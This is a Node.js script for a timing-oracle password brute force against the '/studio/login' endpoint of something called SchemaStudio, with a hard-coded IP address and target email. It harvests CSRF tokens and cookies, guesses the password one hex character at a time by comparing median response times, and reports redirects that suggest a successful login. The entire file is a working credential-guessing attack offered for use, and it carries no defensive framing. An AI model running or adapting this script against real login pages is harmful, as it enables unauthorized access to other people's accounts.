// Timing-oracle brute force for SchemaStudio /studio/login.
const BASE = 'http://59.110.167.211:24785';
const LOGIN = BASE + '/studio/login';
const EMAIL = 'catalog.6bc11190@schemastudio.invalid';
const HEX = '0123456789abcdef'.split('');
const prefix = process.argv[2] || '';
const reps = parseInt(process.argv[3] || '7', 10);
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
async function newSession() {
  const res = await fetch(LOGIN, { redirect: 'manual' });
  const body = await res.text();
  const setCookies = res.headers.getSetCookie ? res.headers.getSetCookie() : [];
  const jar = setCookies.map(c => c.split(';')[0]).join('; ');
  const m = body.match(/name="_token" value="([^"]+)"/);
  if (!m) throw new Error('token not found');
  return { jar, token: m[1], uses: 0 };
}
async function attempt(sess, passwd) {
  const params = new URLSearchParams({ email: EMAIL, passwd, _token: sess.token, submit_login: '1', stay_logged_in: '0' });
  const t0 = performance.now();
  const res = await fetch(LOGIN, { method: 'POST', redirect: 'manual', headers: { 'Content-Type': 'application/x-www-form-urlencoded', Cookie: sess.jar }, body: params.toString() });
  const ms = performance.now() - t0;
  await res.text().catch(() => {});
  return { status: res.status, loc: res.headers.get('location') || '', ms };
}
function median(a) { const s = [...a].sort((x, y) => x - y); const m = Math.floor(s.length / 2); return s.length % 2 ? s[m] : (s[m - 1] + s[m]) / 2; }
(async () => {
  let sess = await newSession();
  const cands = HEX.map(h => prefix + h);
  const samples = new Map(cands.map(c => [c, []]));
  for (let r = 0; r < reps; r++) {
    const order = [...cands].sort(() => Math.random() - 0.5);
    for (const c of order) {
      if (sess.uses >= 40) sess = await newSession();
      try {
        const res = await attempt(sess, 'Ss9!' + c);
        sess.uses++;
        samples.get(c).push(res.ms);
        if (res.loc && !res.loc.includes('login') && res.status === 302) console.log('POSSIBLE-LOGIN candidate=' + c + ' loc=' + res.loc);
      } catch (e) { /* skip */ }
      await sleep(30);
    }
  }
  const ranked = cands.map(c => ({ c, med: median(samples.get(c)), n: samples.get(c).length })).sort((a, b) => b.med - a.med);
  console.log('prefix=' + JSON.stringify(prefix) + ' reps=' + reps);
  for (const r of ranked) console.log(r.c + ' med=' + r.med.toFixed(1) + 'ms n=' + r.n);
  console.log('WINNER: ' + ranked[0].c + ' gap=' + (ranked[0].med - ranked[1].med).toFixed(1) + 'ms');
})();
